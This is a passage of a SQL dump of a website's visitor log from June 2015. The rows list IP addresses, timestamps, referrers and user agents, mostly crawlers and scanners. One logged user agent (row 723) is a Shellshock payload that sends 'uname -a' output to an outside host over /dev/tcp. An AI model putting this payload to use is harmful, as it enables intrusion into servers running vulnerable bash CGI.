SV1)'),(555,'192.99.150.120','2015-06-02','20:54:02','http://domainsigma.com/whois/jubinna.com','Mozilla/5.0 (compatible; DomainSigmaCrawler/0.1; +http://domainsigma.com/robot)'),(556,'157.55.39.155','2015-06-02','21:24:45','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(557,'207.46.13.94','2015-06-03','02:04:37','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(558,'182.118.60.24','2015-06-03','03:37:48','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(559,'46.165.197.141','2015-06-03','04:24:49','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(560,'60.21.141.42','2015-06-03','07:43:20','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(561,'182.118.54.49','2015-06-03','09:10:48','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(562,'198.245.62.10','2015-06-03','09:26:50','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(563,'182.118.53.224','2015-06-03','09:37:10','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(564,'210.216.54.2','2015-06-03','17:01:11','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36'),(565,'118.37.92.209','2015-06-03','18:43:09','','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB7.5; InfoPath.2)'),(566,'61.228.90.24','2015-06-03','20:35:59','',''),(567,'5.9.87.98','2015-06-04','00:49:45','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(568,'207.46.13.71','2015-06-04','05:13:46','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(569,'60.21.141.42','2015-06-04','06:47:29','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(570,'207.46.13.94','2015-06-04','13:36:01','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(571,'111.248.117.76','2015-06-04','16:30:04','',''),(572,'46.101.25.227','2015-06-04','23:23:08','','Internet-wide-scan-to-be-removed-from-this-list-email-info-at-binaryedge.io'),(573,'112.221.70.78','2015-06-10','21:39:10','','Mozilla/5.0 (Linux; Android 5.0.1; SM-N910L Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'),(574,'60.21.141.42','2015-06-11','01:51:50','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(575,'182.118.53.224','2015-06-11','02:13:31','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(576,'54.157.188.75','2015-06-11','03:50:36','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)'),(577,'61.231.3.127','2015-06-11','04:33:19','',''),(578,'207.46.13.68','2015-06-11','06:53:26','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(579,'182.118.53.18','2015-06-11','06:58:27','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(580,'91.121.170.189','2015-06-11','08:22:48','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(581,'103.25.130.105','2015-06-11','11:30:25','',''),(582,'115.115.80.232','2015-06-11','11:44:27','',''),(583,'213.47.217.101','2015-06-11','11:57:44','','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36'),(584,'202.91.176.10','2015-06-11','12:39:24','',''),(585,'207.46.13.69','2015-06-11','12:57:55','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(586,'198.27.82.147','2015-06-11','13:43:06','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(587,'111.248.116.125','2015-06-11','16:25:48','',''),(588,'61.102.12.196','2015-06-11','20:48:15','','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)'),(589,'85.159.232.115','2015-06-11','23:04:52','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(590,'36.229.236.35','2015-06-12','02:36:35','',''),(591,'207.46.13.68','2015-06-12','04:26:32','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(592,'207.46.13.55','2015-06-12','06:25:47','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(593,'157.55.39.164','2015-06-12','12:38:21','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(594,'141.212.122.154','2015-06-12','13:32:27','',''),(595,'111.248.59.217','2015-06-12','13:33:43','',''),(596,'207.46.13.94','2015-06-12','16:14:06','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(597,'207.46.13.109','2015-06-12','18:50:45','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(598,'114.44.57.124','2015-06-12','19:25:02','',''),(599,'52.5.178.63','2015-06-12','21:01:05','',''),(600,'114.44.62.176','2015-06-12','23:13:33','',''),(601,'114.44.59.123','2015-06-13','01:55:01','',''),(602,'182.118.53.14','2015-06-13','01:56:57','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(603,'36.229.80.106','2015-06-13','02:35:11','',''),(604,'111.248.62.199','2015-06-13','02:59:31','',''),(605,'182.118.53.246','2015-06-13','07:49:20','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(606,'218.37.217.113','2015-06-13','09:18:48','','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'),(607,'188.40.109.147','2015-06-13','10:14:18','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(608,'46.4.32.75','2015-06-13','14:07:20','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(609,'209.126.117.84','2015-06-13','16:01:53','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(610,'64.246.165.210','2015-06-13','18:20:58','http://whois.domaintools.com/jubinna.com','Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.13) Gecko/2009073022 Firefox/3.5.2 (.NET CLR 3.5.30729) SurveyBot/2.3 (DomainTools)'),(611,'207.46.13.6','2015-06-13','20:36:40','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(612,'141.212.122.18','2015-06-14','00:46:46','',''),(613,'207.46.13.6','2015-06-14','05:16:16','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(614,'111.248.61.92','2015-06-14','07:38:30','',''),(615,'157.55.39.83','2015-06-14','08:06:18','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(616,'111.248.62.56','2015-06-14','08:10:05','',''),(617,'209.128.119.167','2015-06-14','08:20:58','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0'),(618,'64.79.100.25','2015-06-14','09:26:11','http://www.jubinna.com','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'),(619,'111.243.254.138','2015-06-14','10:27:39','',''),(620,'115.112.238.35','2015-06-14','10:39:46','',''),(621,'157.55.39.20','2015-06-14','22:33:27','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(622,'182.118.54.69','2015-06-15','01:10:06','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(623,'192.99.150.120','2015-06-15','03:04:00','http://domainsigma.com/whois/jubinna.com','Mozilla/5.0 (compatible; DomainSigmaCrawler/0.1; +http://domainsigma.com/robot)'),(624,'125.74.189.200','2015-06-15','03:31:02','',''),(625,'182.118.53.240','2015-06-15','06:43:44','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(626,'157.55.39.20','2015-06-15','10:59:29','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(627,'5.9.89.170','2015-06-15','12:08:16','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(628,'111.248.115.98','2015-06-15','12:30:45','',''),(629,'5.9.87.98','2015-06-15','13:28:48','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(630,'111.243.205.196','2015-06-15','13:29:44','',''),(631,'207.46.13.6','2015-06-15','17:58:49','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(632,'144.76.7.107','2015-06-15','18:41:57','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(633,'157.55.39.83','2015-06-15','20:02:06','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(634,'157.55.39.64','2015-06-15','22:04:48','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(635,'207.46.13.6','2015-06-16','00:39:41','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(636,'114.44.61.182','2015-06-16','01:02:40','',''),(637,'36.226.247.172','2015-06-16','02:27:46','',''),(638,'61.231.1.144','2015-06-16','04:29:46','',''),(639,'178.62.49.28','2015-06-16','08:52:30','','CRAZYWEBCRAWLER 0.9.4, http://www.crazywebcrawler.com'),(640,'141.212.122.194','2015-06-16','09:53:57','',''),(641,'208.43.225.84','2015-06-16','11:22:44','','Mozilla/5.0 (compatible; SiteExplorer/1.0b; +http://siteexplorer.info/)'),(642,'157.55.39.83','2015-06-16','17:53:20','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(643,'111.248.117.162','2015-06-16','20:01:30','',''),(644,'187.32.223.36','2015-06-16','20:12:41','',''),(645,'82.80.216.6','2015-06-16','22:54:19','','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0'),(646,'182.118.53.209','2015-06-17','01:21:42','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(647,'157.55.39.82','2015-06-17','02:42:30','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(648,'61.240.144.67','2015-06-17','07:16:18','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(649,'182.118.53.77','2015-06-17','08:54:15','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(650,'157.55.39.64','2015-06-17','10:32:49','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(651,'103.25.130.105','2015-06-17','14:20:22','',''),(652,'104.255.64.50','2015-06-17','15:09:29','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(653,'82.80.216.6','2015-06-17','17:05:24','','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0'),(654,'162.210.196.130','2015-06-17','17:40:05','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(655,'169.54.233.117','2015-06-17','20:50:56','','Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0'),(656,'111.248.116.77','2015-06-17','21:27:47','',''),(657,'212.83.177.193','2015-06-17','22:42:04','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(658,'207.46.13.39','2015-06-18','06:38:39','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(659,'157.55.39.64','2015-06-18','09:04:05','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(660,'103.25.130.105','2015-06-18','12:30:25','',''),(661,'157.55.39.228','2015-06-18','19:32:30','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(662,'115.28.11.39','2015-06-19','00:30:35','',''),(663,'182.118.54.46','2015-06-19','00:53:53','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(664,'157.55.39.217','2015-06-19','03:35:54','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(665,'182.118.53.77','2015-06-19','07:04:10','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(666,'121.65.41.44','2015-06-19','09:25:19','','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko Swing/2.1.2.0'),(667,'173.208.177.130','2015-06-19','14:39:23','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(668,'68.115.81.28','2015-06-19','16:43:24','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(669,'157.55.39.55','2015-06-19','18:31:20','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(670,'114.44.57.194','2015-06-19','21:56:33','',''),(671,'192.99.1.101','2015-06-19','21:58:14','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(672,'157.55.39.128','2015-06-20','00:27:15','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(673,'111.248.113.229','2015-06-20','00:35:33','',''),(674,'207.46.13.39','2015-06-20','01:34:06','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(675,'5.39.222.253','2015-06-20','12:03:48','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(676,'71.6.165.200','2015-06-20','13:13:15','',''),(677,'61.102.12.196','2015-06-20','16:27:52','','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)'),(678,'60.21.141.174','2015-06-20','22:59:28','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(679,'157.55.39.93','2015-06-21','01:09:34','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(680,'182.118.45.250','2015-06-21','01:14:25','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(681,'199.30.24.178','2015-06-21','02:10:42','http://www.jubinna.com/bbs/board.php?bo_table=mission_01&wr_id=4','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b'),(682,'157.55.39.94','2015-06-21','02:20:58','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(683,'157.55.39.236','2015-06-21','02:26:24','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(684,'157.55.39.166','2015-06-21','02:26:28','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(685,'141.212.122.10','2015-06-21','04:20:51','',''),(686,'182.118.53.50','2015-06-21','09:12:53','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(687,'177.65.215.176','2015-06-21','10:12:33','','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.13)'),(688,'115.115.80.226','2015-06-21','13:02:42','',''),(689,'37.187.129.166','2015-06-21','13:28:17','http://burger-imperia.com/','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36'),(690,'157.55.39.46','2015-06-21','14:43:04','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(691,'46.4.87.105','2015-06-21','20:25:35','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(692,'111.248.62.72','2015-06-21','21:05:01','',''),(693,'118.127.210.224','2015-06-21','22:26:41','','Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.56 Mobile/12F70 Safari/600.1.4'),(694,'157.55.39.193','2015-06-22','07:17:20','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(695,'192.99.150.120','2015-06-22','07:19:50','http://domainsigma.com/whois/jubinna.com','Mozilla/5.0 (compatible; DomainSigmaCrawler/0.1; +http://domainsigma.com/robot)'),(696,'209.126.110.113','2015-06-22','09:07:52','http://hundejo.com/','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36'),(697,'209.126.107.104','2015-06-22','09:32:06','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(698,'115.115.80.226','2015-06-22','09:36:01','',''),(699,'52.16.214.246','2015-06-22','17:32:00','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(700,'207.46.13.73','2015-06-22','19:52:11','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(701,'180.166.105.40','2015-06-22','21:44:16','',''),(702,'166.70.181.109','2015-06-23','00:27:17','http://hvd-store.com/','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36'),(703,'182.118.53.209','2015-06-23','01:24:12','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(704,'174.129.116.114','2015-06-23','02:46:31','','Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB6 (.NET CLR 3.5.30729)'),(705,'5.104.175.207','2015-06-23','03:08:05','','Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1'),(706,'207.46.13.73','2015-06-23','03:26:05','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(707,'185.35.62.11','2015-06-23','03:38:27','',''),(708,'1.34.22.39','2015-06-23','06:00:22','',''),(709,'157.55.39.193','2015-06-23','08:40:39','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(710,'182.118.60.15','2015-06-23','08:54:28','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(711,'182.118.53.14','2015-06-23','09:12:48','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(712,'63.141.251.235','2015-06-23','10:05:13','','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36'),(713,'112.216.179.210','2015-06-23','14:23:45','','Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.56 Mobile/12F70 Safari/600.1.4'),(714,'141.212.122.202','2015-06-23','19:19:50','',''),(715,'218.101.143.182','2015-06-23','21:39:45','','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36'),(716,'61.240.144.67','2015-06-23','23:06:15','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(717,'108.59.8.70','2015-06-24','01:46:50','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(718,'62.75.216.19','2015-06-24','03:31:00','','Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0'),(719,'82.80.216.19','2015-06-24','05:58:41','','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0'),(720,'207.46.13.73','2015-06-24','08:48:18','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(721,'83.142.233.105','2015-06-24','16:05:11','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(722,'195.154.11.217','2015-06-24','17:33:41','','Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)'),(723,'104.192.0.21','2015-06-24','19:38:50','','(){ :; };uname -a > /dev/tcp/104.192.0.21/53'),(724,'52.8.84.20','2015-06-24','21:17:17','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)'),(725,'180.76.15.153','2015-06-24','22:18:12','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(726,'1.34.22.39','2015-06-24','23:33:32','',''),(727,'182.118.53.22','2015-06-25','01:48:09','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(728,'82.80.216.19','2015-06-25','01:56:59','','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0'),(729,'182.118.45.232','2015-06-25','07:56:18','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(730,'157.55.39.204','2015-06-25','09:58:12','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(731,'42.120.160.21','2015-06-25','11:08:53','','YisouSpider'),(732,'195.122.150.129','2015-06-25','11:41:46','http://pizza-tycoon.com/','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36'),(733,'31.192.108.62','2015-06-25','12:28:50','',''),(734,'111.248.61.121','2015-06-25','12:50:21','',''),(735,'220.181.108.165','2015-06-25','14:04:06','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(736,'111.248.113.245','2015-06-25','17:36:43','',''),(737,'78.46.174.197','2015-06-26','03:09:53','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(738,'52.0.89.236','2015-06-26','07:51:57','','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0'),(739,'61.228.89.172','2015-06-26','09:58:55','',''),(740,'198.245.62.10','2015-06-26','20:12:21','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(741,'157.55.39.253','2015-06-26','21:27:07','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(742,'118.37.92.209','2015-06-26','22:11:11','','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB7.5; InfoPath.2)'),(743,'61.240.144.65','2015-06-27','02:04:11','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(744,'182.118.53.101','2015-06-27','02:05:42','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(745,'141.212.122.194','2015-06-27','05:09:12','',''),(746,'182.118.53.202','2015-06-27','09:15:57','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(747,'211.36.152.200','2015-06-27','09:53:07','','Mozilla/5.0 (Linux; Android 5.0.1; SM-N910L Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'),(748,'104.168.39.110','2015-06-27','17:35:06','http://best-seo-report.com','Mozilla/4.0 (compatible; Synapse)'),(749,'207.46.13.2','2015-06-27','20:03:39','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(750,'141.212.122.154','2015-06-27','20:05:09','',''),(751,'198.27.64.208','2015-06-28','01:17:50','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(752,'107.172.9.71','2015-06-28','02:41:43','http://best-seo-report.com','Mozilla/4.0 (compatible; Synapse)'),(753,'94.22.47.242','2015-06-28','04:31:01','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(754,'157.55.39.1','2015-06-28','06:43:52','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(755,'111.248.59.162','2015-06-28','10:10:34','',''),(756,'192.99.150.120','2015-06-28','13:57:17','http://domainsigma.com/whois/jubinna.com','Mozilla/5.0 (compatible; DomainSigmaCrawler/0.1; +http://domainsigma.com/robot)'),(757,'157.55.39.178','2015-06-28','18:35:53','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(758,'207.46.13.2','2015-06-28','18:38:27','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(759,'46.148.18.122','2015-06-28','22:35:21','',''),(760,'182.118.53.119','2015-06-29','01:21:43','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(761,'1.171.248.3','2015-06-29','05:49:18','',''),(762,'182.118.53.176','2015-06-29','07:00:57','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(763,'157.55.39.29','2015-06-29','07:17:47','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(764,'157.55.39.178','2015-06-29','08:07:26','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(765,'111.248.113.57','2015-06-29','13:16:45','',''),(766,'157.55.39.233','2015-06-29','14:22:24','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(767,'64.246.165.180','2015-06-29','15:47:05','http://whois.domaintools.com/jubinna.com','Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.13) Gecko/2009073022 Firefox/3.5.2 (.NET CLR 3.5.30729) SurveyBot/2.3 (DomainTools)'),(768,'157.55.39.179','2015-06-29','18:13:24','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(769,'157.55.39.213','2015-06-29','19:55:07','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(770,'185.35.62.11','2015-06-30','02:50:36','',''),(771,'66.249.16.211','2015-06-30','02:52:54','http://whois.domaintools.com/jubinna.com','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(772,'5.9.89.170','2015-06-30','04:11:13','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(773,'61.240.144.65','2015-06-30','09:10:21','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(774,'178.63.13.15','2015-06-30','18:47:14','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(775,'42.120.160.21','2015-06-30','19:03:45','','YisouSpider'),(776,'42.156.139.21','2015-06-30','19:04:19','','YisouSpider'),(777,'89.248.172.173','2015-06-30','20:03:53','','Mozilla/5.0 (Windows NT 6.1; 